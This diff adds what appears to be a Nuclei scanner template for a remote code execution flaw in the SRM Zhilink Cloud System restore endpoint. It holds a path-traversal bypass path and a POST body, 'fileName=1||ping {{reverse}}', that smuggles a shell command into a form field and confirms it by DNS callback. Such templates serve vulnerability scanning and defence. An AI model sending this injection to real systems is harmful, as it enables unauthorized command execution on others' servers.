@@ -1,0 +1,41 @@
+id: srm-zhilink-restore-rce
+info:
+  name: "SRM Zhilink Cloud System Restore 远程代码执行漏洞"
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: Zhilink
+  description: |
+    Vulnerability in SRM Zhilink Cloud System Restore functionality allows remote code execution.
+    Exploitation involves sending specific payloads to trigger DNS interactions.
+
+variables:
+  reverse: '{{interactsh-url}}'
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - method: GET
+    path:
+      - "/adpweb/static/..;/a/db/dbBackupScheme/restore"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: header
+        words:
+          - "zhilink"
+
+  - method: POST
+    path:
+      - "/adpweb/static/..;/a/db/dbBackupScheme/restore"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "fileName=1||ping {{reverse}}"
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
